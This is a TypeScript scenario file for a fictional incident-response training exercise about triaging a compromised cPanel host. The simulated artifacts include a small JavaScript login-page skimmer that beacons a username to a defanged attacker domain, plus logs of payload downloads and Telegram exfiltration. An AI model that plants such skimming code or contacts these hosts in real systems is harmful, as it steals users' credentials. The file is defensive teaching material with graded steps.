import type { Scenario } from "../types";

export const cpanelFilemanager: Scenario = {
  slug: "cpanel-filemanager",
  exhibit: "EXH-037",
  title: "Control Panel, Control Plane",
  tagline:
    "May 12, 2026. Active exploitation of cPanel and WHM CVE-2026-41940 is public, and a hosting node in your estate has the same Filemanager backdoor indicators XLab described.",
  category: "incident-response",
  difficulty: "advanced",
  era: "2020s",
  year: "2026",
  estMinutes: 11,
  fictional: true,
  cwd: "/home/ir",
  user: "responder",
  host: "whm-edge-17",
  role: "Incident responder for a managed hosting provider. You own the first containment call for shared cPanel infrastructure.",
  objective:
    "Confirm whether this cPanel host shows CVE-2026-41940 compromise, identify the persistence and credential theft paths, and prepare the containment plan.",
  briefing:
    "On May 12, 2026, defenders circulated new reporting on active exploitation of CVE-2026-41940, an unauthenticated cPanel and WHM authentication bypass. XLab attributed one ongoing campaign to Mr_Rot13: a Go infector called Update plants an SSH key, drops a PHP web shell, injects JavaScript into the cPanel login page, exfiltrates credentials and host data, then installs the cross-platform Filemanager backdoor. This node was internet-facing during the window. Walk the artifacts before anyone rotates only the visible passwords and misses persistence.",
  env: {
    USER: "responder",
    SHELL: "/bin/sh",
    PWD: "/home/ir",
  },
  ps: [
    "  PID TTY          TIME CMD",
    "    1 ?        00:00:07 systemd",
    "  212 ?        00:00:03 cpsrvd",
    "  318 ?        00:00:01 cphulkd",
    "  444 ?        00:00:09 httpd",
    "  991 ?        00:00:00 filemanager-linux-amd64",
    " 1110 pts/0    00:00:00 sh",
    " 1118 pts/0    00:00:00 ps",
  ],
  history: ["pwd", "ls"],
  files: {
    "/home/ir/ADVISORY.md": {
      content: [
        "CVE-2026-41940, cPanel and WHM authentication bypass",
        "",
        "Published: XLab report on May 11, 2026; May 12 follow-up coverage",
        "Severity: CVSS 9.8 critical",
        "Impact: remote unauthenticated takeover of cPanel / WHM control panel",
        "Campaign: Mr_Rot13 deploying a Go infector named Update and Filemanager",
        "",
        "Observed attack chain:",
        "  1) bypass WHM authentication and create a root-capable session",
        "  2) download Update from cp.dene[.]de[.]com",
        "  3) change the root password and plant an SSH key labelled cpanel-updater",
        "  4) drop /usr/local/cpanel/cgi-sys/cpanel.py as a PHP web shell",
        "  5) inject login.js into the cPanel login template to steal credentials",
        "  6) exfiltrate to cp.dene[.]de[.]com, wrned[.]com, and a Telegram group",
        "  7) install the cross-platform Filemanager remote-control backdoor",
        "",
        "Your triage order:",
        "  - confirm the server was in the affected cPanel range",
        "  - check raw session artifacts for a root WHM session",
        "  - hunt for SSH, web shell, login-page, and egress indicators",
        "  - treat the host as compromised if any persistence is present",
      ].join("\n"),
    },
    "/home/ir/CONTAINMENT.md": {
      content: [
        "containment worksheet",
        "",
        "[ ] vulnerable cPanel build:        ___________",
        "[ ] raw session shows root auth:    yes / no",
        "[ ] planted SSH key found:          yes / no",
        "[ ] cPanel web shell found:         yes / no",
        "[ ] login template modified:        yes / no",
        "[ ] suspicious outbound domains:    ___________",
        "[ ] safe next action:               rebuild / patch only",
        "",
        "If any persistence is confirmed, do not patch in place and call it clean.",
        "Rebuild from known-good media, rotate every cPanel, WHM, SSH, database,",
        "hosting-panel API, and customer credential that could have crossed this host,",
        "then restore tenant content after web shell and injected-script review.",
      ].join("\n"),
    },
    "/usr/local/cpanel/version": {
      content: [
        "11.122.0.18",
        "# asset note: public WHM listener exposed until 2026-05-12T09:20:00Z",
        "# patch target: fixed build family staged by vendor after disclosure",
      ].join("\n"),
    },
    "/var/cpanel/sessions/raw/sess_9f2a": {
      content: [
        "created=2026-05-12T05:44:17Z",
        "remote_addr=178.249.209.182",
        "user=root",
        "hasroot=1",
        "tfa_verified=1",
        "pass=__preauth_bypass__",
      ].join("\n"),
    },
    "/var/cpanel/sessions/raw/sess_a7c1": {
      content: [
        "created=2026-05-12T07:02:41Z",
        "remote_addr=10.12.4.81",
        "user=responder",
        "hasroot=0",
        "tfa_verified=1",
        "pass=ok",
      ].join("\n"),
    },
    "/root/.ssh/authorized_keys": {
      owner: "root",
      perms: "-rw-------",
      content: [
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPRODhostbreakglass responder-breakglass",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater",
      ].join("\n"),
    },
    "/usr/local/cpanel/cgi-sys/cpanel.py": {
      owner: "root",
      perms: "-rwxr-xr-x",
      content: [
        "<?php",
        "// Synthetic marker for the XLab-described cPanel-Python web shell.",
        "$auth = $_COOKIE['cpanel_session'] ?? '';",
        "if ($auth === 'filemanager-stage') { echo 'upload download exec'; }",
        "?>",
      ].join("\n"),
    },
    "/usr/local/cpanel/base/unprotected/cpanel/login.tmpl": {
      owner: "root",
      content: [
        "<html>",
        "  <head><title>cPanel Login</title></head>",
        "  <body>",
        "    <form id=\"login_form\" method=\"post\">",
        "      <input name=\"user\" />",
        "      <input name=\"pass\" type=\"password\" />",
        "    </form>",
        "    <script src=\"/unprotected/cpanel/login.js\"></script>",
        "  </body>",
        "</html>",
      ].join("\n"),
    },
    "/usr/local/cpanel/base/unprotected/cpanel/login.js": {
      owner: "root",
      content: [
        "// Synthetic reconstruction of the credential-stealer shape.",
        "const rot13C2 = 'uggcf://jearq.pbz/ybt.cuc?g=3';",
        "const decodedC2 = 'https://wrned[.]com/log.php?t=3';",
        "document.querySelector('#login_form')?.addEventListener('submit', () => {",
        "  navigator.sendBeacon(decodedC2, 'user=' + document.querySelector('[name=user]').value);",
        "});",
      ].join("\n"),
    },
    "/var/log/egress.log": {
      content: [
        "2026-05-12T05:44:20Z cpsrvd outbound https://cp.dene[.]de[.]com/Update bytes=412987",
        "2026-05-12T05:44:23Z Update outbound https://cp.dene[.]de[.]com/cpanel.py bytes=18344",
        "2026-05-12T05:44:25Z Update outbound https://cp.dene[.]de[.]com/login.js bytes=7211",
        "2026-05-12T05:44:28Z Update outbound https://cp.dene[.]de[.]com/collect.php bytes=98211",
        "2026-05-12T05:44:31Z Update outbound https://wpsock[.]com/cpanel/install.sh bytes=5120 Filemanager",
        "2026-05-12T05:44:34Z filemanager outbound https://api.telegram.org/bot1190043163:REDACTED/sendDocument bytes=34772",
        "2026-05-12T05:44:39Z httpd outbound https://wrned[.]com/log.php?t=3 bytes=612",
      ].join("\n"),
    },
    "/var/log/secure": {
      content: [
        "2026-05-12T05:44:18Z whm-edge-17 sshd[7812]: Accepted publickey for root from 178.249.209.182 port 48110 ssh2: ED25519 SHA256:cpanel-updater",
        "2026-05-12T05:45:02Z whm-edge-17 sudo: root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /root/.u7812",
        "2026-05-12T07:02:41Z whm-edge-17 sshd[9021]: Accepted publickey for responder from 10.12.4.81 port 55184 ssh2: ED25519 SHA256:responder",
      ].join("\n"),
    },
  },
  steps: [
    {
      id: "advisory",
      goal: "Read the advisory note for the attack chain and triage order.",
      hint: "`cat ADVISORY.md`.",
      matches: [{ kind: "exact", command: "cat ADVISORY.md" }],
      narration:
        "The important shape is not only the auth bypass. The campaign moves immediately to persistence, credential theft, and a remote-control backdoor.",
    },
    {
      id: "version",
      goal: "Confirm the cPanel build this host was running during exposure.",
      hint: "`cat /usr/local/cpanel/version`.",
      matches: [{ kind: "exact", command: "cat /usr/local/cpanel/version" }],
      narration:
        "This host was exposed on an affected build during the public exploitation window. Patching matters, but only after compromise hunting.",
    },
    {
      id: "raw-session",
      goal: "Search raw cPanel session artifacts for a root session.",
      hint: "`grep -nF user=root /var/cpanel/sessions/raw/*`.",
      matches: [
        {
          kind: "exact",
          command: "grep -nF user=root /var/cpanel/sessions/raw/*",
        },
      ],
      narration:
        "A raw session with user=root, hasroot=1, tfa_verified=1, and a preauth-bypass marker is enough to treat the panel as compromised.",
    },
    {
      id: "ssh-key",
      goal: "Check whether the attacker planted the cpanel-updater SSH key.",
      hint: "`grep -nF cpanel-updater /root/.ssh/authorized_keys`.",
      matches: [
        {
          kind: "exact",
          command: "grep -nF cpanel-updater /root/.ssh/authorized_keys",
        },
      ],
      narration:
        "The key label matches the XLab-described persistence. Removing this key alone is not sufficient because credentials and web content may already be stolen.",
    },
    {
      id: "webshell",
      goal: "Find the cPanel-Python web shell path.",
      hint: "`find /usr/local/cpanel -name cpanel.py`.",
      matches: [
        { kind: "exact", command: "find /usr/local/cpanel -name cpanel.py" },
      ],
      narration:
        "/usr/local/cpanel/cgi-sys/cpanel.py should not exist on a clean host. This gives file browsing, upload, and command execution in the control panel tree.",
    },
    {
      id: "template",
      goal: "Check whether the cPanel login template loads the injected script.",
      hint:
        "`grep -nF login.js /usr/local/cpanel/base/unprotected/cpanel/login.tmpl`.",
      matches: [
        {
          kind: "exact",
          command:
            "grep -nF login.js /usr/local/cpanel/base/unprotected/cpanel/login.tmpl",
        },
      ],
      narration:
        "The login page is now a credential harvester. Every user who typed a password after this change needs a reset.",
    },
    {
      id: "c2",
      goal: "Open the injected script's decoded command-and-control target.",
      hint:
        "`grep -nF wrned /usr/local/cpanel/base/unprotected/cpanel/login.js`.",
      matches: [
        {
          kind: "exact",
          command:
            "grep -nF wrned /usr/local/cpanel/base/unprotected/cpanel/login.js",
        },
      ],
      narration:
        "XLab named Mr_Rot13 after this style of ROT13-hidden C2. Here the decoded endpoint is wrned[.]com, used to receive stolen login data.",
    },
    {
      id: "egress",
      goal: "Review egress logs for the Filemanager installer path.",
      hint: "`grep -nF Filemanager /var/log/egress.log`.",
      matches: [
        { kind: "exact", command: "grep -nF Filemanager /var/log/egress.log" },
      ],
      narration:
        "The host fetched the wpsock install script and launched Filemanager. That is persistent remote control, not a patch-only event.",
    },
    {
      id: "secure-log",
      goal: "Correlate the planted SSH key with an actual root login.",
      hint: "`grep -nF cpanel-updater /var/log/secure`.",
      matches: [
        { kind: "exact", command: "grep -nF cpanel-updater /var/log/secure" },
      ],
      narration:
        "The key was used for root SSH within seconds of the raw WHM session. Containment has to assume hands-on-keyboard access occurred.",
    },
    {
      id: "containment",
      goal: "Open the containment worksheet and choose the safe next action.",
      hint: "`cat CONTAINMENT.md`.",
      matches: [{ kind: "exact", command: "cat CONTAINMENT.md" }],
      narration:
        "Fill it in: affected build yes, root session yes, SSH key yes, web shell yes, login template modified yes, egress to cp.dene, wpsock, Telegram, and wrned. Safe next action is rebuild from known-good media, rotate credentials, and review tenant content before restoration.",
    },
  ],
  debrief: {
    summary:
      "CVE-2026-41940 is a critical cPanel and WHM authentication bypass that allows remote attackers to reach administrator control without valid credentials. XLab reported that more than 2,000 attacker source IPs were involved in automated activity after public disclosure, including mining, ransomware, botnets, backdoors, and data theft. In the Mr_Rot13 campaign, attackers used a Go infector named Update to plant SSH persistence, drop a PHP web shell, inject credential-stealing JavaScript into the cPanel login page, exfiltrate host data through attacker infrastructure and Telegram, and install the cross-platform Filemanager remote-control tool.",
    lesson:
      "Internet-facing control panels are production control planes. When an authentication-bypass bug lands there, the useful question is not only whether the patch was applied. The first question is whether the host was ever reachable before the patch, and if so whether raw sessions, SSH keys, web roots, templates, outbound traffic, and hosted content show compromise. If persistence or credential theft is present, rebuild instead of cleaning in place, rotate every credential that could have crossed the host, and make hosting-panel logs part of normal detection coverage.",
    simulated: [
      "The hostnames, IP addresses, file contents, sessions, and logs in this exhibit are invented.",
      "No exploit code is included or executed. The Update, login.js, and Filemanager artifacts are defensive indicators only.",
      "The CVE number, May 2026 reporting, Mr_Rot13 name, Update infector, cpanel-updater SSH key label, cpanel.py web shell path, wrned[.]com C2, wpsock Filemanager installer path, Telegram exfiltration channel, and broad attack-chain shape are based on public XLab and May 12 reporting.",
    ],
  },
};
